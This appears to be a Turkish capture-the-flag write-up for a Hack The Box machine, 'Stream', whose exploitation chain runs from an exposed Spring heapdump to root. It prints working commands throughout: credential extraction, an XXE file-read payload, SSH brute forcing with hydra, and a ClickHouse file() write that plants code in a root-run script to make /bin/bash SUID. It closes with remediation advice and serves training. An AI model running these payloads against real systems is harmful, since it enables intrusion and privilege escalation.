# HTB Stream — Writeup

*Oct 27, 2026 · @b9*

## Özet

Stream, Hack The Box'ın Season 12 döneminde yer alan, orta (medium) zorlukta bir Linux makinesidir. İstismar zinciri, bir havaalanı uçuş-verisi (AIDX) işleme hattı etrafında kuruludur ve baştan sona birbirine bağlı yedi aşamadan oluşur.

Saldırı, Spring Boot Actuator'ın dışarı açık bırakılmış heapdump ucundan başlar; bu bellek dökümünden bir ClickHouse veritabanı kimlik bilgisi çıkarılır. Sanal konak (vhost) keşfiyle `db.htb-airport.htb` (ClickHouse) alt alanı bulunur. AIDX XML ingest servisindeki bir XXE açığı, veritabanına yazılan alanlar üzerinden kör olmayan (in-band) bir sızdırma kanalına dönüştürülür; bununla Kafka yapılandırma dosyası okunur ve içindeki SASL parolası svc-infra olarak SSH girişi için yeniden kullanılır.

Foothold sonrası martin_cole kullanıcısının parolası su brute-force ile kırılarak user flag alınır. Yetki yükseltmede, kullanıcının home dizinindeki Kopia yedek deposu açılır, geri yüklenen ClickHouse loglarından default veritabanı kullanıcısının düz metin parolası elde edilir. Son olarak ClickHouse'un `file()` fonksiyonuyla, root'un systemd timer'ı tarafından çalıştırılan bir Python formatter'ına kod yazılır; Kafka DLQ kuyruğuna mesaj düşürülerek timer tetiklenir ve `/bin/bash` SUID yapılarak root elde edilir.

| Özellik | Değer |
|---|---|
| Makine | Stream |
| İşletim sistemi | Linux (Ubuntu) |
| Zorluk | Medium |
| Sezon | Season 12 |
| Ana teknikler | Heapdump sızıntısı, XXE, kimlik bilgisi yeniden kullanımı, Kopia yedek analizi, ClickHouse `file()` ile dosya yazma, root timer hijack |

## Stream: heapdumptan roota istismar zinciri

```
1. Actuator heapdump
        │  svc_events creds
        ▼
2. ClickHouse erişimi
        │  sızdırma kanalı
        ▼
3. XXE: Kafka config
        │  svc_infra parola
        ▼
4. SSH: svc-infra
        │  rockyou brute
        ▼
5. User: martin_cole
        │  ClickHouse log
        ▼
6. Kopia: default parola
        │  SUID bash
        ▼
7. Root: file() + timer
```

Her kutu bir aşamayı, oklar ele geçirilen yeni erişimi gösterir: heapdump'tan ClickHouse ve XXE üzerinden foothold'a, oradan user ve root'a uzanan yedi adımlık zincir.

## 1. Keşif (Recon)

### Port taraması

Standart bir nmap taraması üç açık port gösterir: 22 (SSH), 80 (nginx) ve 8081.

```
nmap -sC -sV -oA stream <IP>
```

80 portuna yapılan düz istek `http://api.htb-airport.htb/` adresine yönlendirir. Bu, uygulamanın sanal konak (vhost) tabanlı çalıştığını gösterir: içeriği görmek için hostname çözümü gerekir.

### hosts kaydı

`/etc/hosts` dosyasına temel kayıtlar eklenir:

```
<IP>  htb-airport.htb api.htb-airport.htb
```

### İki servisin tanımlanması

`api.htb-airport.htb` (80) bir JSON API gateway döndürür — `terminal-edge-gateway`. Arkasında dört mikroservis olduğunu bildirir: `flight-data-service`, `boarding-control`, `gate-assignment`, `passenger-manifest`.

8081 portu ise ayrı bir servistir ve kendini tanıtır:

```json
{
  "service": "AIDX flight-leg ingest",
  "what": "Accepts AIDX XML for processing",
  "how": { "method": "POST", "path": "/feeds/aidx", "content_type": "application/xml" },
  "required_elements": ["IATA_AIDX_FlightLegNotifRQ", "Originator", "FlightLeg", "LegIdentifier"],
  "note": "Ingest does not parse. Full validation happens downstream."
}
```

8081'in Swagger arayüzü (`/docs`) `server: uvicorn` başlığını açığa çıkarır — yani bu servis Python/FastAPI'dır. 80'deki gateway ise (sonraki aşamada görüleceği üzere) Java/Spring Boot'tur. İki ayrı teknoloji olması, zincirin anlaşılması için kritiktir.

### vhost keşfi

Asıl giriş noktası, sanal konak fuzzing ile bulunur. ffuf ile Host başlığı denenerek var olmayan konakların sabit cevap boyutu filtrelenir:

```
ffuf -w subdomains.txt -u http://<IP>/ -H "Host: FUZZ.htb-airport.htb" -fs <baskın-boyut>
```

Sonuç iki geçerli vhost döndürür:

| Alt alan | Açıklama |
|---|---|
| `api.htb-airport.htb` | Spring gateway (zaten biliniyordu) |
| `db.htb-airport.htb` | ClickHouse veritabanı — yeni ve kritik |

`db.htb-airport.htb` de `/etc/hosts`'a eklenir. Bu alt alan, XXE ile sızdırılan dosyaların okunacağı pencere olacaktır.

## 2. Bilgi Sızıntısı — Spring Boot Heapdump

`api.htb-airport.htb` üzerinde dizin keşfi, `/status`, `/health` ve `/error` dışında Spring Boot Actuator uçlarını açığa çıkarır. `/error` sayfası "Whitelabel Error Page" döndürür — bu, hedefin Spring Boot (Java) olduğunu doğrular.

Actuator uçları incelendiğinde yalnızca heapdump dışarı açık bulunur:

```
curl http://api.htb-airport.htb/actuator
{"_links":{"self":{...},"heapdump":{"href":".../actuator/heapdump"}}}
```

Heapdump, çalışan JVM'in bellek dökümüdür ve production'da asla dışarı açık olmamalıdır. İçinde parolalar, token'lar, DB bağlantı bilgileri gibi hassas veriler düz metin olarak bulunur.

### Heapdump indirme ve analiz

```
curl http://api.htb-airport.htb/actuator/heapdump -o heapdump.hprof
```

`.hprof` dosyası HPROF binary formatındadır. Credential çıkarmak için JDumpSpider kullanılır (string karmaşasını eler, yapılandırılmış veriyi kategorize eder):

```
java -jar JDumpSpider.jar heapdump.hprof
```

### Çıkan kritik veriler

JDumpSpider çıktısında ClickHouse (HikariCP) bağlantı kimlik bilgisi bulunur:

| Alan | Değer |
|---|---|
| username | `svc_events` |
| password | `Yl4aCgh4y2PnU` |

Ayrıca yapılandırma ipuçları da görünür:

- `management.endpoint.heapdump.access = unrestricted` — heapdump'ın neden açık olduğunu açıklar
- `spring.application.name = terminal-gateway`
- `databaseURL = jdbc:h2:mem:terminaldb` (uygulamanın yerel H2'si; asıl veri ClickHouse'tadır)

Ham strings taraması sırasında bir login isteği de görülür: `{"credential":"xadmin","password":"o2"}`. Bu, zincirde doğrudan kullanılmaz; asıl kullanılacak kimlik bilgisi `svc_events` ClickHouse parolasıdır.

## 3. ClickHouse Erişimi

`db.htb-airport.htb`, ClickHouse'un HTTP arayüzüdür (`Ok.` döndürür). Heapdump'tan çıkan `svc_events` / `Yl4aCgh4y2PnU` kimlik bilgisiyle sorgu çalıştırılabilir. ClickHouse HTTP arayüzünde kimlik bilgisi URL'de veya başlıkta verilir:

```
curl -s 'http://svc_events:Yl4aCgh4y2PnU@db.htb-airport.htb/?query=SHOW+DATABASES'
```

### Veritabanı ve tablo keşfi

Tek bir kullanıcı veritabanı vardır: `partner_feed`. İçindeki tablolar, verinin Kafka'dan gelip materialized view ile işlendiği bir hattı gösterir:

```
flightleg_json        flightleg_raw
flightleg_json_kafka  flightleg_raw_kafka
flightleg_json_mv     flightleg_raw_mv
```

`flightleg_raw` gönderilen ham XML'i, `flightleg_json` ise parse edilip JSON'a çevrilmiş halini tutar. `flightleg_json` tablosunun yapısı:

```
transaction_id, originator, message_type, version, msg_timestamp,
airline, flight_number, departure_airport, arrival_airport,
origin_date, repeat_number, operational_status, event, ingested
```

Bu tablo kritiktir: AIDX ingest servisine gönderilen XML, parse edildikten sonra buraya yazılır. Dolayısıyla XXE ile sızdırılan dosya içeriği de bu tablonun bir sütununda görünecektir — kör (blind) XXE'ye ve bir dinleyiciye gerek kalmadan. Bu, makinenin en zarif noktasıdır: asenkron bir veri hattı, saldırgan kontrollü alanlar sonradan saklanıp sorgulanabildiği için bir sızdırma kanalına dönüşür.

## 4. XXE — AIDX Ingest Üzerinden Dosya Okuma

8081'deki `POST /feeds/aidx` ucu XML kabul eder ve "ingest does not parse, downstream validates" der. Yani XML ham olarak Kafka kuyruğuna atılır, asıl parse işlemini downstream (Java) servisi yapar. XXE tam burada tetiklenir.

### Kanal bulma: neden Originator çalışmadı

İlk denemelerde entity'yi `Originator` alanına koymak işe yaramadı — `flightleg_json.originator` sütunu null döndü. Yalın bir payload gönderildiğinde parser alanı hiç okumuyordu.

Gerçek kayıtlar incelendiğinde (`WHERE originator != ''`), parser'ın `LegIdentifier` altında tam AIDX şemasını (`Airline`, `FlightNumber`, `DepartureAirport` vb.) beklediği görüldü. Doğru şema gönderildiğinde `airline` ve `flight_number` sütunları doldu — ama `originator`'a konan entity hâlâ çözülmüyordu.

Çözüm: entity, downstream normalizer'ın sakladığı bir alana — `FlightNumber` — yerleştirildiğinde çözüldü. Çıktı `flight_number` sütununda belirdi.

### Çalışan XXE payload'u

```
curl -s -X POST http://api.htb-airport.htb:8081/feeds/aidx \
  -H 'Content-Type: application/xml' \
  --data-binary '<?xml version="1.0"?><!DOCTYPE IATA_AIDX_FlightLegNotifRQ [
  <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><IATA_AIDX_FlightLegNotifRQ
  Version="22.1"><Originator>BA</Originator><FlightLeg><LegIdentifier>
  <Airline>BA</Airline><FlightNumber>&xxe;</FlightNumber>
  <DepartureAirport>LHR</DepartureAirport><ArrivalAirport>JFK</ArrivalAirport>
  <OriginDate>2026-08-20</OriginDate><RepeatNumber>1</RepeatNumber>
  </LegIdentifier></FlightLeg></IATA_AIDX_FlightLegNotifRQ>'
```

### Sonucu ClickHouse'tan okuma

```
curl -s 'http://svc_events:Yl4aCgh4y2PnU@db.htb-airport.htb/?query=SELECT+flight_number+FROM+partner_feed.flightleg_json+ORDER+BY+ingested+DESC+LIMIT+1+FORMAT+TSVRaw'
```

`/etc/passwd` içeriği `flight_number` alanında döner. `FORMAT TSVRaw` satır sonlarını korur.

`/etc/passwd`, giriş yapabilen (bash'li) kullanıcıları ortaya koyar:

| Kullanıcı | UID | Not |
|---|---|---|
| svc-infra | 1000 | İlk hedef |
| martin_cole | 1001 | User flag burada |
| clickhouse | 996 | /bin/false |
| root | 0 | Nihai hedef |

### Kafka yapılandırmasını okuma

Aynı payload'da sadece dosya yolu değiştirilerek Kafka config dosyası okunur. Not: parser izole çalıştığı için `/proc`, `/opt/ops`, dizin listeleme gibi yollar boş döner; yalnızca erişilebilen gerçek dosyalar okunabilir. Kafka'nın `server.properties` dosyası erişilebilirdir:

```
file:///opt/kafka_2.13-4.3.1/config/server.properties
```

Dönen içeriğin güvenlik bölümünde SASL kimlik bilgisi düz metin bulunur:

```
sasl.enabled.mechanisms=PLAIN
listener.name.sasl_plaintext.plain.sasl.jaas.config=org.apache.kafka.common.security.plain.PlainLoginModule required \
  user_svc_infra="Ny2hdpme$bwT3";
allow.everyone.if.no.acl.found=true
```

Elde edilen Kafka SASL kimlik bilgisi: `svc_infra` / `Ny2hdpme$bwT3`. Ayrıca `allow.everyone.if.no.acl.found=true` satırı, ileride DLQ'ya kimlik doğrulamasız mesaj basmamızı sağlayacaktır.

## 5. Foothold — svc-infra SSH

Kafka SASL parolası, svc-infra sistem kullanıcısının SSH parolasıyla aynıdır (kimlik bilgisi yeniden kullanımı):

```
ssh svc-infra@<IP>
# parola: Ny2hdpme$bwT3
```

Giriş başarılıdır:

```
svc-infra@stream:~$ id
uid=1000(svc-infra) gid=1000(svc-infra) groups=1000(svc-infra),100(users)
```

Foothold alınmıştır. `martin_cole`'un home dizini `drwxr-x---` izinleriyle korunur; user flag'e ulaşmak için o kullanıcıya geçmek gerekir.

## 6. User — martin_cole

Eldeki parolaların martin_cole'da yeniden kullanımı tutmaz. Parola, SSH üzerinden rockyou ile brute-force edilerek kırılır:

```
hydra -l martin_cole -P rockyou.txt ssh://<IP> -t 4
```

Not: SSH için düşük paralellik (`-t 4`) gerekir; yüksek değer bağlantı reddine yol açar. Çok sayıda hydra bağlantısından sonra SSH kısa süreli "connection refused" verebilir — bu durumda hydra durdurulup birkaç dakika beklenir.

Bulunan parolayla martin_cole olarak giriş yapılır ve user flag alınır:

```
ssh martin_cole@<IP>
cat ~/user.txt
```

## 7. Yetki Yükseltme — Bölüm 1: Kopia Yedeği

martin_cole'un home dizininde bir `backups` klasörü ve `.config/kopia` bulunur. `backups`, filesystem tabanlı bir Kopia yedek deposudur.

```
kopia repository connect filesystem --path=/home/martin_cole/backups
# parola: martin_cole'un SSH parolası
```

Depo parolası, martin_cole'un SSH parolasıyla aynıdır. Bağlandıktan sonra snapshot listelenir:

```
kopia snapshot list
```

Tek bir snapshot vardır: `/home/martin_cole/ch-logs` (ClickHouse logları, ~1.4 MB). Geri yüklenir:

```
kopia snapshot restore <snapshot-id> /tmp/ch-logs
```

### default parolasını loglardan çıkarma

Geri yüklenen loglar içinde `clickhouse-server.err.log`, hatalı bir sorgu yüzünden default kullanıcısının parolasını düz metin açığa çıkarır:

```
grep -iE 'IDENTIFIED|password|CREATE USER' /tmp/ch-logs/clickhouse-server.err.log
```

Çıktı:

```
... DB::Exception: Double quoted string is not closed ...
"ALTER USER default IDENTIFIED BY 'N3v3rs33nD4T4 ;
```

ClickHouse default kullanıcısının parolası: `N3v3rs33nD4T4`. Doğrulanır:

```
clickhouse-client --user default --password 'N3v3rs33nD4T4' --query 'SELECT currentUser()'
# → default
```

## 8. Yetki Yükseltme — Bölüm 2: ClickHouse file() ile Root

### Zafiyetin mekanizması

Root, bir systemd timer ile her 2 dakikada bir `/opt/ops/dlq_drainer.py`'yi çalıştırır:

```
# /etc/systemd/system/aidx-dlq-drainer.service
[Service]
Type=oneshot
User=root
ExecStart=/usr/bin/python3 /opt/ops/dlq_drainer.py
```

Bu script, Kafka DLQ topic'inden (`aidx.flightleg.dlq.v1`) mesaj tükettiğinde, ClickHouse'un `user_files` dizinindeki bir formatter'ı çağırır:

```
FORMATTER = "/var/lib/clickhouse/user_files/aidx_quarantine.py"
```

default ClickHouse kullanıcısı `FILE` yetkisine sahiptir — yani `file()` fonksiyonuyla bu formatter dosyasına yazabilir. Formatter root tarafından çalıştırıldığından, içine yazılan kod root olarak koşar.

### Formatter'a payload yazma

Reverse shell yerine, dinleyici gerektirmeyen bir yol seçilir: `/bin/bash`'e SUID bit'i verdiren kod. ClickHouse `file()` INSERT'i ile:

```
clickhouse-client --user default --password 'N3v3rs33nD4T4' --query "INSERT INTO FUNCTION file('aidx_quarantine.py', 'RawBLOB') SELECT 'import os\nos.system(\"chmod u+s /bin/bash\")\n' SETTINGS engine_file_truncate_on_insert=1"
```

### Timer'ı tetikleme

Formatter yalnızca DLQ kuyruğunda işlenecek mesaj olduğunda çağrılır. `server.properties`'teki `allow.everyone.if.no.acl.found=true` sayesinde DLQ'ya kimlik doğrulamasız mesaj basılabilir:

```
echo "trigger" | /opt/kafka_2.13-4.3.1/bin/kafka-console-producer.sh --bootstrap-server localhost:9092 --topic aidx.flightleg.dlq.v1
```

Bir sonraki timer turunda (en fazla 2 dakika) drainer bu mesajı tüketir, formatter'ı root olarak çalıştırır ve `/bin/bash` SUID olur:

```
ls -la /bin/bash
# -rwsr-xr-x 1 root root ... /bin/bash
```

### Root

```
/bin/bash -p
id   # euid=0(root)
cat /root/root.txt
```

Root elde edilmiş, makine tamamen ele geçirilmiştir.

## 9. Zincir Özeti ve Çözüm Önerileri

### Elde edilen kimlik bilgileri

| Aşama | Kimlik bilgisi | Nereden |
|---|---|---|
| ClickHouse | `svc_events` / `Yl4aCgh4y2PnU` | Heapdump |
| Kafka SASL → SSH | `svc_infra` / `Ny2hdpme$bwT3` | XXE → server.properties |
| User | `martin_cole` / (rockyou) | su/SSH brute-force |
| ClickHouse default | `default` / `N3v3rs33nD4T4` | Kopia yedek → ClickHouse log |

### Çözüm önerileri (remediation)

- **Actuator uçlarını kısıtla:** heapdump ve diğer hassas Actuator uçları production'da dışarı açılmamalı; `management.endpoints.web.exposure` sıkılaştırılmalı, kimlik doğrulaması zorunlu olmalı.
- **XML parser'ı güvenli yapılandır:** lxml/Java parser'da external entity çözümü kapatılmalı (`resolve_entities=False`, `no_network=True`); DTD işleme devre dışı bırakılmalı.
- **Kimlik bilgisi yeniden kullanımını önle:** Kafka SASL parolası ile Linux kullanıcı parolası aynı olmamalı; servis hesapları ayrı ve rastgele parolalar kullanmalı.
- **Parolaları loglama:** ClickHouse sorgu loglarına düz metin parola düşmemeli; `ALTER USER ... IDENTIFIED BY` gibi ifadeler loglardan maskelenmeli.
- **Yedek deposunu koru:** Kopia depo parolası, kullanıcının giriş parolasıyla aynı olmamalı; yedekler ayrı erişim denetimiyle saklanmalı.
- **ClickHouse yetkilerini daralt:** default kullanıcısının `FILE` yetkisi kaldırılmalı; `user_files` dizinine yazma, root tarafından çalıştırılan script yollarından ayrılmalı.
- **Root timer güven sınırı:** Root olarak çalışan systemd servisleri, düşük yetkili bir sürecin (ClickHouse) yazabildiği dosyaları çalıştırmamalı.
